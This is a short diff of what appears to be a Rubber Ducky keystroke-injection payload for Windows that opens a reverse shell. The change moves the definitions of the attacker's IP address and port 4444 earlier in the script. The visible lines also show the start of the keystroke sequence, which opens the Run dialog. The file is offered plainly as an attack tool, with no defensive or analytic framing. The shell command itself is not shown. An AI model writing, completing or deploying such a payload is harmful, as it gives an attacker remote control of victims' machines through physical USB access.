@@ -6,6 +6,11 @@ REM Credits: Thank you to 0i41E (Reverse shell code).
 REM Compatible with: Windows 10, Windows 11, Windows 10 Home Edition, Windows 11 Home Edition.
 REM HAS NOT BEEN TESTED YET!!!
 
+REM Define the attackers IP & Port for the Reverse Shell to work
+DEFINE ADDRESS '0.0.0.0'
+DEFINE PORT 4444
+
+
 EXTENSION DETECT_READY
     REM VERSION 1.1
     REM AUTHOR: Korben
@@ -100,11 +105,6 @@ REM _____________________
     END_WHILE
     CAPSLOCK
 END_EXTENSION
-
-
-REM Define the attackers IP & Port
-DEFINE ADDRESS '0.0.0.0'
-DEFINE PORT 4444
 
 DELAY 1000
 GUI r
